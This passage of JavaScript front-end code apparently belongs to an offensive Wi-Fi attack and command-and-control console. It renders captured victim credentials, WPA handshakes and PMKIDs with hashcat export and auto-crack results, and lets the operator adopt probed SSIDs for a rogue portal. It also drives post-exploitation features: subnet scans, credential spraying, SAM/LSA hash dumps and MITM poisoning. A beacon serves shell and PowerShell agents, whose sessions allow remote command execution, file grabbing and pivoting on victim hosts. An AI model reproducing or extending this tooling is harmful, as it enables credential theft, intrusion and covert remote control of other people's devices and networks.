        probes: l.probes || [],
        cracked: l.cracked || [],
        files: l.files || [],
        pinned: l.pinned || { creds: [], devices: [] }
      };
      $('nav-loot').textContent = loot.creds.length + loot.devices.length + loot.handshakes.length +
        loot.cracked.length + loot.probes.length + loot.files.length;
      $('lc-creds').textContent = loot.creds.length || '';
      $('lc-devices').textContent = loot.devices.length || '';
      var hsOnly = (loot.handshakes || []).filter(function (h) { return (h.kind || '').toLowerCase() !== 'pmkid'; });
      $('lc-hs').textContent = hsOnly.length || '';
      $('lc-pmkid').textContent = (loot.handshakes || []).filter(function (h) { return (h.kind || '').toLowerCase().indexOf('pmkid') !== -1; }).length || '';
      $('lc-pcaps').textContent = (loot.files || []).filter(function (f) { return /\.pcap$/i.test(f.name || ''); }).length || '';
      $('lc-cracked').textContent = loot.cracked.length || '';
      $('lc-probes').textContent = loot.probes.length || '';
      renderLootTab(lootTab);
      renderProbePanel();
      renderLootCharts();
      if (cur === 'dashboard') renderDashboardCharts();
    });
  }

  function switchLootTab(tab) {
    lootTab = tab;
    renderLootTab(tab);
  }

  function credKey(e) {
    return ((e.ts || '') + '|' + (e.username || '') + '|' + (e.mac || ''));
  }

  function bindPins(tbody) {
    tbody.querySelectorAll('.pin-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        var kind = btn.getAttribute('data-kind');
        var id = decodeURIComponent(btn.getAttribute('data-id'));
        apiGet('pin', { kind: kind, id: id }).then(function (r) {
          if (!r.ok) { toast('Pin failed: ' + (r.error || '?'), true); return; }
          loot.pinned = r.pinned || loot.pinned;
          renderLootTab(lootTab);
        });
      });
    });
  }

  function renderLootTab(tab) {
    $('table-creds').parentElement.style.display = (tab === 'creds') ? '' : 'none';
    $('table-devices').parentElement.style.display = (tab === 'devices') ? '' : 'none';
    $('table-handshakes').parentElement.style.display = (tab === 'handshakes') ? '' : 'none';
    $('table-pmkid').parentElement.style.display = (tab === 'pmkid') ? '' : 'none';
    $('table-pcaps').parentElement.style.display = (tab === 'pcaps') ? '' : 'none';
    $('table-cracked').parentElement.style.display = (tab === 'cracked') ? '' : 'none';
    $('table-probes').parentElement.style.display = (tab === 'probes') ? '' : 'none';
    $('loot-files').style.display = (tab === 'files') ? '' : 'none';
    $('btn-export-csv').disabled = (tab === 'files');
    $('btn-export-json').disabled = (tab !== 'creds');

    var creds = $('table-creds').querySelector('tbody');
    if (tab === 'creds') {
      if (!loot.creds.length) {
        creds.innerHTML = '<tr><td colspan="7" class="empty">No credentials captured yet</td></tr>';
        return;
      }
      var pinnedCreds = (loot.pinned && loot.pinned.creds) || [];
      creds.innerHTML = loot.creds.map(function (e) {
        var k = credKey(e);
        var pin = pinnedCreds.indexOf(k) !== -1;
        return '<tr><td><button class="pin-btn' + (pin ? ' active' : '') + '" data-kind="cred" data-id="' +
          encodeURIComponent(k) + '" title="' + (pin ? 'Unpin' : 'Pin (kept on clear)') + '">' +
          (pin ? '★' : '☆') + '</button></td><td>' + esc(fmtTime(e.ts)) + '</td><td>' + esc(e.device) + '</td>' +
          '<td>' + esc(e.username || '—') + '</td><td class="pass">' + esc(e.password || '—') + '</td>' +
          '<td>' + esc(e.ip || '—') + '</td><td>' + esc(e.mac || '—') + '</td></tr>';
      }).join('');
      bindPins(creds);
      return;
    }
    if (tab === 'devices') {
      var devs = $('table-devices').querySelector('tbody');
      if (!loot.devices.length) {
        devs.innerHTML = '<tr><td colspan="7" class="empty">No device fingerprints yet</td></tr>';
        return;
      }
      var pinnedDevs = (loot.pinned && loot.pinned.devices) || [];
      devs.innerHTML = loot.devices.map(function (d) {
        var mac = (d.mac || '').toUpperCase();
        var pin = pinnedDevs.indexOf(mac) !== -1;
        return '<tr><td><button class="pin-btn' + (pin ? ' active' : '') + '" data-kind="device" data-id="' +
          encodeURIComponent(mac) + '" title="' + (pin ? 'Unpin' : 'Pin (kept on clear)') + '">' +
          (pin ? '★' : '☆') + '</button></td><td>' + esc(fmtTime(d.last_seen)) + '</td><td>' + esc(d.mac || '—') + '</td><td>' +
          esc(d.os || '—') + '</td><td>' + esc(d.hostname || '—') + '</td><td>' +
          esc((d.ips || []).join(', ')) + '</td><td>' + esc(d.creds) + '</td></tr>';
      }).join('');
      bindPins(devs);
      return;
    }
    if (tab === 'handshakes') {
      var hs = $('table-handshakes').querySelector('tbody');
      var hsList = (loot.handshakes || []).filter(function (h) { return (h.kind || '').toLowerCase() !== 'pmkid'; });
      if (!hsList.length) {
        hs.innerHTML = '<tr><td colspan="8" class="empty">No 4-way handshake captures yet</td></tr>';
        return;
      }
      hs.innerHTML = hsList.map(function (h) {
        var v = h.checked
          ? (h.valid
              ? '<span style="color:var(--green)">&#10003; crackable</span>'
              : '<span style="color:var(--red)">&#10007; not usable</span>')
          : '<span style="color:var(--amber)">—</span>';
        var dl = '';
        if (h.file) {
          dl = ' <a class="btn" data-hs="' + encodeURIComponent(h.file) +
            '" href="#" style="padding:2px 8px;font-size:11px">22000</a>';
        }
        return '<tr><td>' + esc(fmtTime(h.ts)) + '</td><td>' + esc(h.bssid || '—') + '</td><td>' +
          esc(h.ssid || '—') + '</td><td>' + esc(h.client || '—') + '</td><td>' +
          esc(h.kind || '—') + '</td><td>' + v + '</td><td>' +
          esc(h.file ? h.file.replace(/^.*\//, '') : (dl ? '—' : 'no pcap')) + dl + '</td><td class="pass">' +
          (h.cracked
            ? '<span style="color:var(--green)">' + esc(h.cracked) + '</span>'
            : '—') + '</td></tr>';
      }).join('');
      hs.querySelectorAll('a[data-hs]').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          downloadUrl(API + '?' + qs({ action: 'hashcat_export', token: session.sid || '',
                                       file: decodeURIComponent(a.getAttribute('data-hs')) }),
                      'malstrom_capture.22000');
        });
      });
      return;
    }
    if (tab === 'pmkid') {
      var pm = $('table-pmkid').querySelector('tbody');
      var pmList = (loot.handshakes || []).filter(function (h) { return (h.kind || '').toLowerCase().indexOf('pmkid') !== -1; });
      if (!pmList.length) {
        pm.innerHTML = '<tr><td colspan="8" class="empty">No PMKID captures yet</td></tr>';
        return;
      }
      pm.innerHTML = pmList.map(function (h) {
        var v = h.checked
          ? (h.valid
              ? '<span style="color:var(--green)">&#10003; crackable</span>'
              : '<span style="color:var(--red)">&#10007; not usable</span>')
          : '<span style="color:var(--amber)">—</span>';
        var dl = '';
        if (h.file) {
          dl = ' <a class="btn" data-hs="' + encodeURIComponent(h.file) +
            '" href="#" style="padding:2px 8px;font-size:11px">22000</a>';
        }
        var pcapCell = esc(h.file ? h.file.replace(/^.*\//, '') : 'no pcap');
        var linkCell = dl ? dl.replace('22000', '22000') : '—';
        return '<tr><td>' + esc(fmtTime(h.ts)) + '</td><td>' + esc(h.bssid || '—') + '</td><td>' +
          esc(h.ssid || '—') + '</td><td>' + esc(h.client || '—') + '</td><td>' + v + '</td><td>' +
          pcapCell + '</td><td>' + linkCell + '</td><td class="pass">' +
          (h.cracked
            ? '<span style="color:var(--green)">' + esc(h.cracked) + '</span>'
            : '—') + '</td></tr>';
      }).join('');
      pm.querySelectorAll('a[data-hs]').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          downloadUrl(API + '?' + qs({ action: 'hashcat_export', token: session.sid || '',
                                       file: decodeURIComponent(a.getAttribute('data-hs')) }),
                      'malstrom_pmkid.22000');
        });
      });
      return;
    }
    if (tab === 'pcaps') {
      var pc = $('table-pcaps').querySelector('tbody');
      var pcList = (loot.files || []).filter(function (f) { return /\.pcap$/i.test(f.name || ''); });
      if (!pcList.length) {
        pc.innerHTML = '<tr><td colspan="4" class="empty">No pcaps captured yet</td></tr>';
        return;
      }
      pc.innerHTML = pcList.map(function (f) {
        var n = f.name || '';
        var dl = '<a class="btn" data-pcap="' + encodeURIComponent(n) + '" href="#" style="padding:2px 8px;font-size:11px">DOWNLOAD</a>';
        var exp = /\.pcap$/i.test(n)
          ? ' <a class="btn" data-hs="' + encodeURIComponent(n) + '" href="#" style="padding:2px 8px;font-size:11px">22000</a>'
          : '';
        var pv = ' <button class="btn" data-pv="' + encodeURIComponent(n) + '" style="padding:2px 8px;font-size:11px">PREVIEW</button>';
        var rm = ' <a class="btn" data-rm="' + encodeURIComponent(n) + '" href="#" style="padding:2px 8px;font-size:11px;color:var(--red)">DELETE</a>';
        return '<tr><td>' + esc(n) + '</td><td>' + esc(f.size) + ' B</td><td>' + dl + pv + rm + '</td><td>' + exp + '</td></tr>';
      }).join('');
      pc.querySelectorAll('a[data-pcap]').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          var url = API + '?' + qs({ action: 'loot_file', token: session.sid || '', file: decodeURIComponent(a.getAttribute('data-pcap')) });
          fetch(url, { credentials: 'same-origin' }).then(function (r) { return r.blob(); }).then(function (b) {
            downloadBlob(b, decodeURIComponent(a.getAttribute('data-pcap')).replace(/^.*\//, ''));
          });
        });
      });
      pc.querySelectorAll('a[data-rm]').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          var fn = decodeURIComponent(a.getAttribute('data-rm'));
          if (!confirm('Delete ' + fn + '?')) return;
          apiGet('loot_delete', { file: fn }).then(function (r) {
            if (!r.ok) { alert(r.error || 'delete failed'); return; }
            lootPoll();
          });
        });
      });
      pc.querySelectorAll('a[data-hs]').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          downloadUrl(API + '?' + qs({ action: 'hashcat_export', token: session.sid || '',
                                       file: decodeURIComponent(a.getAttribute('data-hs')) }),
                      'malstrom_capture.22000');
        });
      });
      pc.querySelectorAll('button[data-pv]').forEach(function (b) {
        b.addEventListener('click', function (e) {
          e.preventDefault();
          var f = decodeURIComponent(b.getAttribute('data-pv'));
          var pv = $('pcap-preview');
          pv.style.display = '';
          pv.innerHTML = '<div style="opacity:0.6">Analyzing ' + esc(f) + '...</div>';
          apiGet('pcap_info', { file: f }).then(function (r) {
            if (!r || !r.ok) { pv.innerHTML = '<div style="color:var(--red)">Preview failed: ' + esc((r && r.error) || '?') + '</div>'; return; }
            var essid = r.essid || '—';
            if (/^[0-9a-fA-F]+$/.test(essid) && essid.length % 2 === 0 && essid.length > 0) {
              try { essid = decodeURIComponent(essid.replace(/../g, '%$&')); } catch (e) { }
            }
            pv.innerHTML =
              '<div style="margin-bottom:6px; color:#ff6b6b; font-weight:700;">' + esc(f) + '</div>' +
              '<div style="display:grid; grid-template-columns: repeat(auto-fit,minmax(110px,1fr)); gap:6px;">' +
                '<div><span style="opacity:0.5">packets</span> ' + r.packets + '</div>' +
                '<div><span style="opacity:0.5">beacons</span> ' + r.beacons + '</div>' +
                '<div><span style="opacity:0.5">auth</span> ' + r.auth + '</div>' +
                '<div><span style="opacity:0.5">assoc</span> ' + r.assoc + '</div>' +
                '<div><span style="opacity:0.5">EAPOL</span> ' + r.eapol + '</div>' +
                '<div><span style="opacity:0.5">M1</span> ' + r.m1 + ' <span style="opacity:0.5">M2</span> ' + r.m2 + ' <span style="opacity:0.5">M3</span> ' + r.m3 + ' <span style="opacity:0.5">M4</span> ' + r.m4 + '</div>' +
                '<div><span style="opacity:0.5">PMKID</span> ' + r.pmkid + '</div>' +
                '<div><span style="opacity:0.5">ESSID</span> ' + esc(essid || '—') + '</div>' +
              '</div>' +
              (r.eapol === 0 ? '<div style="margin-top:6px; color:var(--amber)">No EAPOL frames — AP did not leak a PMKID and no client reassociated.</div>' : '');
          });
        });
      });
      return;
    }
    if (tab === 'cracked') {
      var ck = $('table-cracked').querySelector('tbody');
      if (!loot.cracked.length) {
        ck.innerHTML = '<tr><td colspan="5" class="empty">Nothing cracked yet — auto-crack runs when a verified capture lands</td></tr>';
        return;
      }
      ck.innerHTML = loot.cracked.slice().reverse().map(function (c) {
        return '<tr><td>' + esc(fmtTime(c.ts)) + '</td><td>' + esc(c.ssid || '—') + '</td><td>' +
          esc(c.bssid || '—') + '</td><td class="pass">' + esc(c.psk || '') + '</td><td>' +
          esc(c.source || '—') + '</td></tr>';
      }).join('');
      return;
    }
    if (tab === 'probes') {
      var pb = $('table-probes').querySelector('tbody');
      if (!loot.probes.length) {
        pb.innerHTML = '<tr><td colspan="3" class="empty">No probe requests yet</td></tr>';
        return;
      }
      pb.innerHTML = loot.probes.slice().reverse().slice(0, 100).map(function (p) {
        return '<tr><td>' + esc(fmtTime(p.ts)) + '</td><td>' + esc(p.mac || '—') + '</td><td>' +
          esc(p.ssid || '—') + '</td></tr>';
      }).join('');
      return;
    }
    if (tab === 'files') {
      var box = $('loot-files');
      if (!loot.files.length) {
        box.innerHTML = '<div class="empty">No files in the loot tree yet</div>';
        return;
      }
      var nonPcap = (loot.files || []).filter(function (f) { return !/\.pcap$/i.test(f.name || ''); });
      if (!nonPcap.length) {
        box.innerHTML = '<div class="empty">No non-pcap files in the loot tree yet (pcaps have their own tab)</div>';
        return;
      }
      box.innerHTML = '<table class="cred-table"><thead><tr><th>File</th><th>Size</th><th></th></tr></thead><tbody>' +
        nonPcap.map(function (f) {
          return '<tr><td>' + esc(f.name) + '</td><td>' + esc(f.size) + ' B</td><td>' +
            '<a class="dl" href="#" data-file="' + encodeURIComponent(f.name) + '">DOWNLOAD</a> ' +
            '<a class="rm" href="#" data-file="' + encodeURIComponent(f.name) + '" style="color:var(--red)">DELETE</a></td></tr>';
        }).join('') + '</tbody></table>';
      box.querySelectorAll('a.dl').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          var url = API + '?' + qs({ action: 'loot_file', token: session.sid || '', file: decodeURIComponent(a.getAttribute('data-file')) });
          fetch(url, { credentials: 'same-origin' }).then(function (r) { return r.blob(); }).then(function (b) {
            downloadBlob(b, decodeURIComponent(a.getAttribute('data-file')).replace(/^.*\//, ''));
          });
        });
      });
      box.querySelectorAll('a.rm').forEach(function (a) {
        a.addEventListener('click', function (e) {
          e.preventDefault();
          if (!confirm('Delete ' + decodeURIComponent(a.getAttribute('data-file')) + '?')) return;
          apiGet('loot_delete', { file: decodeURIComponent(a.getAttribute('data-file')) }).then(function (r) {
            if (!r.ok) { alert(r.error || 'delete failed'); return; }
            lootPoll();
          });
        });
      });
    }
  }

  function renderProbePanel() {
    var box = $('tbl-probes').querySelector('tbody');
    if (!loot.probes.length) {
      box.innerHTML = '<tr><td colspan="4" class="empty">No probe requests recorded yet</td></tr>';
      return;
    }
    box.innerHTML = loot.probes.slice().reverse().slice(0, 30).map(function (p) {
      return '<tr><td>' + esc(fmtTime(p.ts)) + '</td><td>' + esc(p.mac || '—') + '</td><td>' +
        esc(p.ssid || '—') + '</td><td><button class="btn" data-adopt="' + encodeURIComponent(p.ssid || '') +
        '" style="padding:4px 10px;font-size:11px">ADOPT</button></td></tr>';
    }).join('');
    box.querySelectorAll('button[data-adopt]').forEach(function (b) {
      b.addEventListener('click', function () {
        var ssid = decodeURIComponent(b.getAttribute('data-adopt'));
        apiGet('adopt_ssid', { ssid: ssid }).then(function (r) {
          if (r.ok) {
            $('cfg-ssid').value = ssid;
            markDirty('cfg-ssid');
            toast('Adopted probe interest: ' + ssid);
            statusPoll();
          } else toast('Adopt failed: ' + (r.error || '?'), true);
        });
      });
    });
  }

  function alertsPoll() {
    apiGet('alerts').then(function (a) {
      if (!a.ok) return;
      var box = $('alert-box');
      $('nav-alerts').textContent = a.alerts ? a.alerts.length : 0;
      if (!a.alerts || !a.alerts.length) {
        box.innerHTML = '<div class="empty">No alerts</div>';
      } else {
        box.innerHTML = a.alerts.map(function (al) {
          return '<div class="alert-item"><span class="time">' + esc(fmtTime(al.ts)) + '</span>' + esc(al.msg) + '</div>';
        }).reverse().join('');
      }
      renderAlertCharts(a.alerts || []);
    });
  }

  // --- post-exploitation (recon / lateral / mitm / sessions) --------------------
  function opsPoll() {
    apiGet('ops').then(function (o) {
      if (!o.ok) return;
      ops = {
        scans: o.scans || [],
        owned: o.owned || [],
        hashes: o.hashes || [],
        beacons: o.beacons || [],
        mitm: o.mitm || { running: 0, tail: [] },
        beacon: o.beacon || { on: 0 },
        scan_busy: !!o.scan_busy,
        spray_busy: !!o.spray_busy
      };
      $('nav-recon').textContent = ops.scans.length || '';
      $('nav-owned').textContent = ops.owned.length || '';
      $('nav-hash').textContent = ops.hashes.length || '';
      $('nav-sess').textContent = ops.beacons.length || '';
      renderScans();
      renderOwned();
      renderHashes();
      renderMitm();
      renderLateralCharts();
      renderMitmCharts();
      renderSessions();
      renderBeacon();
      buildHostList();
    });
  }

  function renderBeacon() {
    var on = !!ops.beacon.on;
    $('cfg-beacon').checked = on;
    $('beacon-payloads').style.display = on ? '' : 'none';
    $('beacon-status').textContent = on
      ? 'Armed — serve <code>http://' + gatewayHint() + '/beacon</code> (sh) or <code>/beacon.ps1</code> (Windows), key '
        + (ops.beacon.key || '').slice(0, 6) + '…'
      : 'Off — agents phone home but receive nothing';
  }

  function gatewayHint() {
    return (state && state.sys && state.sys.portal_ip) || '172.16.52.1';
  }

  function buildHostList() {
    var done = null;
    ops.scans.forEach(function (s) { if (s.status === 'done' && (!done || s.started > done.started)) done = s; });
    var dl = $('scan-hosts-dl');
    var box = $('scan-hosts-box');
    if (done && done.hosts && done.hosts.length) {
      var list = done.hosts.map(function (h) { return h.ip; });
      dl.innerHTML = list.map(function (i) { return '<option value="' + esc(i) + '"></option>'; }).join('');
      var rows = done.hosts.map(function (h) {
        var ports = (done.ports && done.ports[h.ip] && done.ports[h.ip].length)
          ? done.ports[h.ip].map(function (p) { return p.port + '/' + (p.svc || p.proto); }).join(', ')
          : '';
        return '<tr><td>' + esc(h.ip) + '</td><td>' + esc(h.mac || '—') + '</td><td>' +
          esc(h.hostname || '—') + '</td><td>' + esc(ports || '—') + '</td></tr>';
      }).join('');
      box.innerHTML = '<table class="cred-table"><thead><tr><th>IP</th><th>MAC</th><th>Hostname</th><th>Open ports</th></tr></thead><tbody>' +
        rows + '</tbody></table>';
      $('btn-scan-to-spray').disabled = false;
    } else {
      box.innerHTML = '<div class="empty">Run a scan to build the subnet picture</div>';
      $('btn-scan-to-spray').disabled = true;
    }
  }

  function renderScans() {
    var tb = $('tbl-scans').querySelector('tbody');
    // dump / crack job states on the lateral + mitm panels
    var recent = ops.scans.filter(function (s) {
      return s.kind === 'crack' || s.kind === 'sam' || s.kind === 'lsa';
    });
    var last = recent[recent.length - 1];
    if (last) {
      var st = last.status === 'running' ? 'running…'
        : last.status === 'done'
          ? (last.kind === 'crack'
              ? 'done — ' + (last.cracked || 0) + ' recovered'
              : 'done — ' + ((last.hashes || []).length) + ' hashes')
          : (last.status === 'error' ? 'error: ' + (last.error || '?') : last.status);
      if (last.kind === 'crack') $('crack-state').textContent = st;
      else $('dump-state').textContent = st;
    }
    if (!ops.scans.length) {
      tb.innerHTML = '<tr><td colspan="5" class="empty">No scans yet</td></tr>';
      return;
    }
    tb.innerHTML = ops.scans.slice().reverse().slice(0, 25).map(function (s) {
      var st = s.status;
      var badge = st === 'done' ? '<span style="color:var(--green)">done</span>'
        : st === 'running' ? '<span style="color:var(--amber)">running…</span>'
          : '<span style="color:var(--red)">' + (st === 'error' ? 'error' : st) + '</span>';
      return '<tr><td>' + esc(fmtTime(s.ts)) + '</td><td>' + esc(s.kind === 'ping' ? 'discovery' : s.kind) +
        '</td><td>' + esc(s.target || '') + '</td><td>' + badge + '</td><td>' +
        esc(s.hosts ? s.hosts.length : '') + '</td></tr>';
    }).join('');
  }

  function renderOwned() {
    var tb = $('tbl-owned').querySelector('tbody');
    if (!ops.owned.length) {
      tb.innerHTML = '<tr><td colspan="5" class="empty">No validated pairs yet</td></tr>';
      return;
    }
    tb.innerHTML = ops.owned.slice().reverse().slice(0, 60).map(function (o) {
      return '<tr><td>' + esc(fmtTime(o.ts)) + '</td><td>' + esc(o.proto || '') + '</td><td>' +
        esc(o.ip || '') + '</td><td>' + esc(o.user || '') + '</td><td class="pass">' + esc(o.pass || '') + '</td></tr>';
    }).join('');
  }

  function renderHashes() {
    var tb = $('tbl-hashes').querySelector('tbody');
    if (!ops.hashes.length) {
      tb.innerHTML = '<tr><td colspan="4" class="empty">No hashes captured yet</td></tr>';
      return;
    }
    tb.innerHTML = ops.hashes.slice().reverse().slice(0, 60).map(function (h) {
      return '<tr><td>' + esc(fmtTime(h.ts)) + '</td><td>' + esc(h.user || '?') + '</td>' +
        '<td class="pass" style="font-size:11px">' + esc(h.token || '') + '</td><td class="pass">' +
        (h.pass ? '<span style="color:var(--green)">' + esc(h.pass) + '</span>' : '—') +
        '</td></tr>';
    }).join('');
  }

  function renderMitm() {
    var on = !!ops.mitm.running;
    var btn = $('btn-mitm');
    btn.textContent = on ? 'DISARM POISONING' : 'ARM POISONING';
    btn.disabled = on ? false : !(state && state.state && state.state.active);
    $('mitm-status').textContent = on
      ? 'Active on ' + (ops.mitm.iface || '?') + ' — hashes streaming to Loot'
      : 'Standby (requires the chain to be armed — portal subnet up)';
    var box = $('mitm-log');
    if (ops.mitm.tail && ops.mitm.tail.length) {
      box.textContent = ops.mitm.tail.join('\n');
      box.scrollTop = box.scrollHeight;
    } else {
      box.innerHTML = '<div class="empty">Not running</div>';
    }
  }

  function renderSessions() {
    var tb = $('tbl-sessions').querySelector('tbody');
    var sel = $('sess-select');
    var cur = sel.value || sessSel;
    if (!ops.beacons.length) {
      tb.innerHTML = '<tr><td colspan="9" class="empty">No sessions yet</td></tr>';
      sel.innerHTML = '<option value="">(no sessions)</option>';
      $('sess-out').innerHTML = '<div class="empty">Nothing returned yet</div>';
      return;
    }
    tb.innerHTML = ops.beacons.map(function (s) {
      var st = s.state || 'live';
      var badge = st === 'live'
        ? '<span style="color:var(--green)">&#9679; LIVE</span>'
        : st === 'stale'
          ? '<span style="color:var(--amber)">&#9679; STALE</span>'
          : '<span style="color:var(--red)">&#9679; DEAD</span>';
      return '<tr><td>' + esc(s.id) + '</td><td>' + esc(s.ip || '') + '</td><td>' + esc(s.host || '—') +
        '</td><td>' + esc(s.os || '—') + '</td><td>' + esc(s.user || '—') + '</td><td>' + badge + '</td><td>' +
        esc(fmtTime(s.last_seen)) + '</td><td>' + esc((s.tasks || []).length) + '</td><td>' +
        '<button class="btn" data-c2="' + esc(s.id) + '" style="padding:4px 10px;font-size:11px">CMD</button></td></tr>';
    }).join('');
    sel.innerHTML = ops.beacons.map(function (s) {
      var label = esc(s.host || s.ip) + ' (' + esc(s.os || '?') + ')';
      return '<option value="' + esc(s.id) + '">' + label + '</option>';
    }).join('');
    sel.value = cur;
    sessSel = sel.value;
    var active = null;
    ops.beacons.forEach(function (s) { if (sessSel === s.id) active = s; });
    if (!active) active = ops.beacons.slice().sort(function (a, b) { return (b.last_seen || '').localeCompare(a.last_seen || ''); })[0];
    var out = active && active.out && active.out.length ? active.out.slice().reverse() : [];
    if (!out.length) {
      $('sess-out').innerHTML = '<div class="empty">Nothing returned yet</div>';
    } else {
      $('sess-out').innerHTML = out.map(function (o) {
        var dl = '';
        if (o.file) {
          var fn = decodeURIComponent(o.file).replace(/^.*beacon\//, 'beacon/');
          dl = ' <a class="btn" target="_blank" style="padding:2px 8px;font-size:11px" href="' + API + '?' +
            qs({ action: 'loot_file', token: session.sid || '', file: fn }) + '">DOWNLOAD</a>';
        }
        return '<div class="logline"><span class="t">[' + esc(fmtTime(o.ts)) + '] ' + esc(o.cmd || '') + '</span><br><span class="m">' +
          String(o.out || '').replace(/</g, '&lt;').replace(/\n/g, '<br>') + '</span>' + dl + '</div>';
      }).join('');
    }
    tb.querySelectorAll('button[data-c2]').forEach(function (b) {
      b.addEventListener('click', function () {
        sessSel = b.getAttribute('data-c2');
        $('sess-select').value = sessSel;
        setView('sessions');
        $('sess-cmd').focus();
      });
    });
    renderTerminal(active);
    renderFileBrowser(active);
    renderPivots(active);
  }

  function renderTerminal(active) {
    $('cfg-term').checked = !!(active && active.term_on);
    $('sess-term-state').textContent = active && active.term_on
      ? '(streaming — commands run on the agent at each poll)'
      : '(started when you run the first command)';
    var lines = (active && active.term && active.term.length)
      ? active.term.map(function (t) {
          return '$ ' + (t.cmd || '') + '\n' + (t.out || '');
        }).join('\n')
      : '';
    var box = $('sess-term');
    if (!lines) { box.textContent = ''; return; }
    if (box.textContent !== lines) {
      box.textContent = lines;
      box.scrollTop = box.scrollHeight;
    }
  }

  function renderFileBrowser(active) {
    var out = $('sess-ls');
    var entries = active && active.tasks
      ? active.tasks.filter(function (t) { return t.kind === 'ls' && t.entries; })
          .slice(-1)[0]
      : null;
    if (!entries || !entries.entries.length) {
      out.innerHTML = '<div class="empty">Run a LIST to browse</div>';
      return;
    }
    var base = (entries.browse || '').replace(/\/$/, '');
    var rows = entries.entries.map(function (e) {
      var icon = e.dir ? '&#128193; ' : '&#128196; ';
      var gabtn = e.dir ? '' : ' <button class="btn" data-grab="' + esc(base + '/' + e.name) + '" style="padding:2px 8px;font-size:11px">GRAB</button>';
      return '<tr><td>' + icon + esc(e.name) + '</td><td>' + (e.link ? '&rarr; ' + esc(e.link) : '') +
        '</td><td>' + (e.dir ? '—' : esc(e.size)) + '</td><td>' + gabtn + '</td></tr>';
    }).join('');
    out.innerHTML = '<div class="tbl-wrap"><table class="cred-table"><thead><tr><th>Name</th><th>Link</th><th>Size</th><th></th></tr></thead><tbody>' +
      rows + '</tbody></table>' +
      '<div class="hint">Path: ' + esc(entries.browse) + ' &mdash; click a dir row name to drill in</div></div>';
    out.querySelectorAll('button[data-grab]').forEach(function (b) {
      b.addEventListener('click', function () {
        $('sess-file').value = b.getAttribute('data-grab');
        sendSessFile();
      });
    });
    out.querySelectorAll('td:first-child').forEach(function (td) {
      if (!(td.textContent || '').replace(/[^A-Za-z0-9._\/-]/g, '').length) return;
      td.style.cursor = 'pointer';
      td.addEventListener('click', function () {
        var name = td.textContent.replace(/^\S+ /, '').trim();
        if (!name) return;
        $('sess-ls-path').value = (base + '/' + name).replace(/\/+$/, '');
        apiGet('beacon_ls', { sid: sessSel, path: $('sess-ls-path').value.trim() });
        toast('Queueing listing of ' + $('sess-ls-path').value);
        opsPoll();
      });
    });
  }

  function renderPivots(active) {
    var fws = (active && active.fws) || [];
    var box = $('sess-fw-list');
    if (!fws.length) {
      box.innerHTML = '<div class="empty">No active forwards on this session</div>';
      return;
    }
    box.innerHTML = '<div class="tbl-wrap"><table class="cred-table"><thead><tr><th>Victim listener</th></tr></thead><tbody>' +
      fws.map(function (f) { return '<tr><td>' + esc(f) + '</td></tr>'; }).join('') +
      '</tbody></table></div>';
  }

  function sendSessCmd() {
    var sid = $('sess-select').value || sessSel;
    var cmd = $('sess-cmd').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!cmd) { toast('Type a command', true); return; }
    apiGet('beacon_cmd', { sid: sid, cmd: cmd }).then(function (r) {
      if (r.ok) { toast('Command queued to ' + sid); $('sess-cmd').value = ''; opsPoll(); }
      else toast('Queue failed: ' + (r.error || '?'), true);
    });
  }

  $('btn-scan-run').addEventListener('click', function () {
    var target = $('scan-target').value.trim();
    var kind = $('scan-kind').value;
    if (!target) { toast('Specify a target first', true); return; }
    $('scan-state').textContent = 'Running…';
    apiGet('scan_start', { target: target, kind: kind, range: $('scan-range').value || '1-1000' }).then(function (r) {
      if (r.ok) toast('Scan queued: ' + kind + ' ' + target);
      else { toast('Scan failed: ' + (r.error || '?'), true); $('scan-state').textContent = 'Idle'; }
      opsPoll();
    });
  });

  $('btn-scan-to-spray').addEventListener('click', function () {
    var done = null;
    ops.scans.forEach(function (s) { if (s.status === 'done' && (!done || s.started > done.started)) done = s; });
    if (!done || !done.hosts) { toast('No completed scan', true); return; }
    $('spray-targets').value = (done.hosts || []).map(function (h) { return h.ip; }).join(' ');
    setView('lateral');
    toast('Host list loaded into Lateral');
  });

  // --- Radio recon (passive radar + deep scan) ---------------------------------

  var radar = { snap: null, deep: [], deepAt: 0, pollAt: 0 };

  function updateClock() {
    var el = $('top-clock');
    if (!el) return;
    var d = new Date();
    var p = function (n) { return (n < 10 ? '0' : '') + n; };
    el.textContent = p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
  }

  function ago(sec) {
    sec = Math.max(0, Number(sec) || 0);
    if (sec < 60) return Math.round(sec) + 's';
    if (sec < 3600) return Math.floor(sec / 60) + 'm ' + Math.round(sec % 60) + 's';
    return Math.floor(sec / 3600) + 'h ' + Math.floor((sec % 3600) / 60) + 'm';
  }

  function bytes(n) {
    n = Number(n) || 0;
    if (n >= 1e9) return (n / 1e9).toFixed(2) + ' GB';
    if (n >= 1e6) return (n / 1e6).toFixed(1) + ' MB';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + ' kB';
    return Math.round(n) + ' B';
  }

  function compact(n) {
    return (window.MChart && MChart.fmtCompact) ? MChart.fmtCompact(n)
      : String(Math.round(Number(n) || 0));
  }

  function sigClass(sig) {
    if (sig === null || sig === undefined) return 'weak';
    return sig >= -60 ? 'good' : (sig >= -75 ? 'mid' : 'weak');
  }

  function sigHtml(sig) {
    if (sig === null || sig === undefined) return '<span class="sig weak">—</span>';
    return '<span class="sig ' + sigClass(sig) + '">' + esc(sig) + '</span>';
  }

  function secGroup(sec) {
    sec = String(sec || 'OPEN').toUpperCase();
    if (sec.indexOf('WPA3') >= 0) return 'WPA3';
    if (sec.indexOf('WPA2') >= 0) return 'WPA2';
    if (sec.indexOf('WPA') >= 0) return 'WPA';
    if (sec.indexOf('WEP') >= 0) return 'WEP';
    return 'OPEN';
  }

  function secBadge(sec) {
    var g = secGroup(sec);
    return '<span class="sec-badge ' + g.toLowerCase() + '">' + esc(sec || 'OPEN') + '</span>';
  }

  function clone(obj) {
    var out = {};
    Object.keys(obj || {}).forEach(function (k) { out[k] = obj[k]; });
    return out;
  }

  function mergedAps() {
    var snap = radar.snap || {};
    var map = {}, list = [];
